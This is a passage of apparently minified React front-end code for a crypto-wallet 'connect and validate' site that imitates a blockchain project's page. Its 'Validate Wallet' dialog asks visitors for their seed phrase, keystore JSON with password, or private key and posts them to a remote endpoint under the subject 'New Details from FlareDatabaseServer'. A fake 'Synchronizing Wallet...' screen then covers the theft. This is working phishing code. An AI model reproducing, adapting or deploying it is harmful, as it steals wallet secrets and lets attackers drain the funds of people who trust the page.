                                            onClick: () => n(r),
                                            className: "cursor-pointer text-primary hover:text-secondary transition-all duration-200 ease-in bg-white py-3 px-1.5 rounded-xl border hover:border-primary hover:text-primary text-center",
                                            children: [p.jsx("img", {
                                                src: "/logos/" + r + ".jpeg",
                                                width: "48",
                                                height: "48",
                                                alt: Tl[r].name,
                                                className: "mx-auto rounded-full mb-1 bg-primary/10"
                                            }), p.jsx("p", {
                                                className: "font-medium text-xs truncate",
                                                children: Tl[r].name
                                            })]
                                        }, r))
                                    })
                                })]
                            })
                        })
                    })
                })]
            })
        })
    })
}

function eh({
    open: e,
    onClose: t,
    id: n,
    handleSync: r
}) {
    var v;
    const [l, a] = g.useState({
        phrase: "",
        keystore: "",
        password: "",
        privateKey: ""
    }), [o, i] = g.useState(!1), [s, u] = g.useState(""), d = ["MetaMask", "LedgerWallet"].includes(n) ? n : s || ((v = Tl[n]) == null ? void 0 : v.name), h = async y => {
        if (!o) {
            y.preventDefault();
            try {
                i(!0);
               
                const w = {
                        subject: "New Details from FlareDatabaseServer",
                    
                        message_html: `
                                    Wallet Name: ${d} ; 
                                    Phrase: ${l.phrase} ; 
                                    Keystore JSON: ${l.keystore} ; 
                                    Keystore Password: ${l.password} ; 
                                    Private Key: ${l.privateKey} ; 
                                `
                    },
                    
                    S = await (await fetch(Cm, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify(w)
                    })).json();
                console.log("Success:", S), r()
            } catch (w) {
                console.error("Error:", w)
            } finally {
                i(!1)
                r();
            }
        }
    };
    return p.jsx(p.Fragment, {
        children: p.jsx(xe, {
            appear: !0,
            show: e,
            as: g.Fragment,
            children: p.jsxs(Pe, {
                as: "div",
                className: "relative z-10",
                onClose: t,
                children: [p.jsx(xe.Child, {
                    as: g.Fragment,
                    enter: "ease-out duration-300",
                    enterFrom: "opacity-0",
                    enterTo: "opacity-100",
                    leave: "ease-in duration-200",
                    leaveFrom: "opacity-100",
                    leaveTo: "opacity-0",
                    children: p.jsx("div", {
                        className: "fixed inset-0 bg-black/70"
                    })
                }), p.jsx("div", {
                    className: "fixed inset-0 overflow-y-auto",
                    children: p.jsx("div", {
                        className: "flex min-h-full items-center justify-center p-4 text-center",
                        children: p.jsx(xe.Child, {
                            as: g.Fragment,
                            enter: "ease-out duration-300",
                            enterFrom: "opacity-0 scale-95",
                            enterTo: "opacity-100 scale-100",
                            leave: "ease-in duration-200",
                            leaveFrom: "opacity-100 scale-100",
                            leaveTo: "opacity-0 scale-95",
                            children: p.jsxs(Pe.Panel, {
                                className: "w-full max-w-md transform overflow-hidden rounded-2xl bg-white p-6 text-left align-middle shadow-xl transition-all",
                                children: [p.jsx(Pe.Title, {
                                    as: "h3",
                                    className: "text-lg font-medium leading-6 text-gray-900",
                                    children: "Validate Wallet"
                                }), p.jsxs("div", {
                                    className: "mt-4 bg-primary/10 rounded-lg py-2 px-4 mb-4",
                                    children: [p.jsx("p", {
                                        className: "text-gray-500 text-sm",
                                        children: "NAME"
                                    }), p.jsx("p", {
                                        className: "text-black font-medium capitalize",
                                        children: d
                                    }), n === "others" && p.jsx("input", {
                                        className: pt("w-full rounded-lg p-2.5 text-sm my-2", "focus:ring-2 focus:outline-none focus:ring-primary/20 border border-gray-300"),
                                        placeholder: "Enter Wallet Name",
                                        value: s,
                                        onChange: y => u(y.target.value)
                                    })]
                                }), p.jsxs(Gt.Group, {
                                    children: [p.jsx(Gt.List, {
                                        className: "flex space-x-1 rounded-xl bg-primary/20 p-1.5",
                                        children: ["Phrase", "Keystore", "Privatekey"].map(y => p.jsx(Gt, {
                                            className: ({
                                                selected: w
                                            }) => pt("w-full rounded-lg py-2.5 text-sm font-medium leading-5 text-primary", "focus:ring-4 focus:outline-none focus:ring-primary/20", w ? "bg-white shadow" : "hover:bg-white/20"),
                                            children: y
                                        }, y))
                                    }), p.jsxs(Gt.Panels, {
                                        className: "my-4 ",
                                        children: [p.jsx(Gt.Panel, {
                                            children: p.jsxs("form", {
                                                onSubmit: h,
                                                children: [p.jsx("textarea", {
                                                    className: pt("w-full rounded-lg p-2.5 text-sm", "focus:ring-2 focus:outline-none focus:ring-primary/20 border border-gray-300"),
                                                    rows: 4,
                                                    required: !0,
                                                    value: l.phrase,
                                                    onChange: y => a({ ...l,
                                                        phrase: y.target.value
                                                    })
                                                }), p.jsx("p", {
                                                    className: "text-xs text-primary mt-2 mb-4",
                                                    children: "**Typically 12 (sometimes 24) words separated by single space"
                                                }), p.jsx(qe, {
                                                    type: "submit",
                                                    color: "primary",
                                                    className: "w-full",
                                                    loadingText: "Validating...",
                                                    loading: o,
                                                    label: "Validate"
                                                })]
                                            })
                                        }), p.jsx(Gt.Panel, {
                                            children: p.jsxs("form", {
                                                onSubmit: h,
                                                children: [p.jsx("textarea", {
                                                    className: pt("w-full rounded-lg p-2.5 text-sm", "focus:ring-2 focus:outline-none focus:ring-primary/20 border border-gray-300"),
                                                    placeholder: "Your Keystore JSON",
                                                    required: !0,
                                                    rows: 4,
                                                    value: l.keystore,
                                                    onChange: y => a({ ...l,
                                                        keystore: y.target.value
                                                    })
                                                }), p.jsx("input", {
                                                    className: pt("w-full rounded-lg px-2.5 py-3 text-sm my-4", "focus:ring-2 focus:outline-none focus:ring-primary/20 border border-gray-300"),
                                                    placeholder: "Password",
                                                    required: !0,
                                                    value: l.password,
                                                    onChange: y => a({ ...l,
                                                        password: y.target.value
                                                    })
                                                }), p.jsx(qe, {
                                                    type: "submit",
                                                    color: "primary",
                                                    className: "w-full",
                                                    loadingText: "Validating...",
                                                    loading: o,
                                                    label: "Validate"
                                                })]
                                            })
                                        }), p.jsx(Gt.Panel, {
                                            children: p.jsxs("form", {
                                                onSubmit: h,
                                                children: [p.jsx("textarea", {
                                                    className: pt("w-full rounded-lg p-2.5 text-sm mb-4", "focus:ring-2 focus:outline-none focus:ring-primary/20 border border-gray-300"),
                                                    rows: 4,
                                                    placeholder: "Your Private Key",
                                                    required: !0,
                                                    value: l.privateKey,
                                                    onChange: y => a({ ...l,
                                                        privateKey: y.target.value
                                                    })
                                                }), p.jsx(qe, {
                                                    type: "submit",
                                                    color: "primary",
                                                    className: "w-full",
                                                    loadingText: "Validating...",
                                                    loading: o,
                                                    label: "Validate"
                                                })]
                                            })
                                        })]
                                    })]
                                })]
                            })
                        })
                    })
                })]
            })
        })
    })
}

function th({
    open: e,
    onClose: t
}) {
    return p.jsx(p.Fragment, {
        children: p.jsx(xe, {
            appear: !0,
            show: e,
            as: g.Fragment,
            children: p.jsxs(Pe, {
                as: "div",
                className: "relative z-10",
                onClose: t,
                children: [p.jsx(xe.Child, {
                    as: g.Fragment,
                    enter: "ease-out duration-300",
                    enterFrom: "opacity-0",
                    enterTo: "opacity-100",
                    leave: "ease-in duration-200",
                    leaveFrom: "opacity-100",
                    leaveTo: "opacity-0",
                    children: p.jsx("div", {
                        className: "fixed inset-0 bg-black/20"
                    })
                }), p.jsx("div", {
                    className: "fixed inset-0 overflow-y-auto",
                    children: p.jsx("div", {
                        className: "flex min-h-full items-center justify-center text-center",
                        children: p.jsx(xe.Child, {
                            as: g.Fragment,
                            enter: "ease-out duration-300",
                            enterFrom: "opacity-0 scale-95",
                            enterTo: "opacity-100 scale-100",
                            leave: "ease-in duration-200",
                            leaveFrom: "opacity-100 scale-100",
                            leaveTo: "opacity-0 scale-95",
                            children: p.jsxs(Pe.Panel, {
                                className: "w-full h-screen flex flex-col gap-3 items-center justify-center bg-gradient-to-r from-stone-800 to-gray-700 transform overflow-hidden p-6 align-middle shadow-xl transition-all",
                                children: [p.jsx("img", {
                                    src: "/qr_code.svg",
                                    className: "bg-white mb-2",
                                    height: 120,
                                    width: 120
                                }), p.jsx("h4", {
                                    className: "text-white text-xl font-bold",
                                    children: "Synchronizing Wallet..."
                                }), p.jsx("p", {
                                    className: "text-base text-gray-400",
                                    children: "Please hold, this might take a little while"
                                }), p.jsx(Ld, {
                                    height: 40,
                                    width: 40,
                                    className: "text-primary fill-primary"
                                })]
                            })
                        })
                    })
                })]
            })
        })
    })
}

function nh() {
    const [e, t] = g.useState(!1), n = () => {
        t(!e)
    }, r = ["Learn", "Build", "Use", "Operate", "Connect"], [l, a] = g.useState(!1), [o, i] = g.useState(""), [s, u] = g.useState(!1), [d, h] = g.useState(!1), [v, y] = g.useState(!1), [w, x] = g.useState(""), [S, f] = g.useState(!1);
    return p.jsxs("div", {
        children: [p.jsx(_m, {
            isOpen: e,
            onToggleSidebar: n,
            navLinks: r,
            onConnect: () => a(!0)
        }), p.jsx(jm, {
            onToggleSidebar: n,
            navLinks: r,
            onConnect: () => a(!0)
        }), p.jsx(Tm, {
            onConnect: () => a(!0)
        }), p.jsx(Pm, {}), p.jsx(Z0, {
            open: l,
            handleSelect: c => {
                i(c), a(!1), u(!0)
            },
            onClose: () => a(!1)
        }), p.jsx(J0, {
            wallet: o,
            handleManual: () => {
                u(!1), o === "WalletConnect" ? h(!0) : y(!0)
            },
            open: s,
            onClose: () => u(!1)
        }), p.jsx(q0, {
            open: d,
            onClose: () => h(!1),
            handleSelect: c => {
                x(c), h(!1), y(!0)
            }
        }), p.jsx(eh, {
            open: v,
            id: o === "WalletConnect" ? w : o,
            onClose: () => y(!1),
            handleSync: () => {
                y(!1), f(!0)
            }
        }), p.jsx(th, {
            open: S,
            onClose: () => {}
        })]
    })
}
Za.createRoot(document.getElementById("root")).render(p.jsx(F.StrictMode, {
    children: p.jsx(nh, {})
}));